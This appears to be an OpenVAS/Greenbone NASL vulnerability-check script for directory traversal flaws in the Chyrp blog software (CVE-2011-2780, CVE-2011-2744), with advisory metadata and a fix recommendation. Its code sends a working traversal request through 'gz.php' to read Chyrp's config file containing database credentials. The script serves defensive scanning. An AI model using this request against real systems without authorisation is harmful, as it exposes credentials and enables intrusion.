if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902611" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)" );
	script_cve_id( "CVE-2011-2780", "CVE-2011-2744" );
	script_bugtraq_id( 48672 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Chyrp Multiple Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45184" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/68565" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/68564" );
	script_xref( name: "URL", value: "http://www.justanotherhacker.com/advisories/JAHx113.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow the attackers to read arbitrary files
  and gain sensitive information on the affected application." );
	script_tag( name: "affected", value: "Chyrp version prior to 2.1.1" );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user supplied input to
  'file' parameter in 'includes/lib/gz.php' and 'action' parameter in
  'index.php' before being used to include files." );
	script_tag( name: "solution", value: "Upgrade to Chyrp version 2.1.1" );
	script_tag( name: "summary", value: "The host is running Chyrp and is prone to Multiple directory
  traversal vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://chyrp.net/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/blog", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/", port: port );
	if(ContainsString( res, "Powered by" ) && ContainsString( res, ">Chyrp<" )){
		url = NASLString( dir, "/includes/lib/gz.php?file=/themes/../includes" + "/config.yaml.php" );
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, "<?php" ) && ContainsString( res, "username:" ) && ContainsString( res, "database:" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

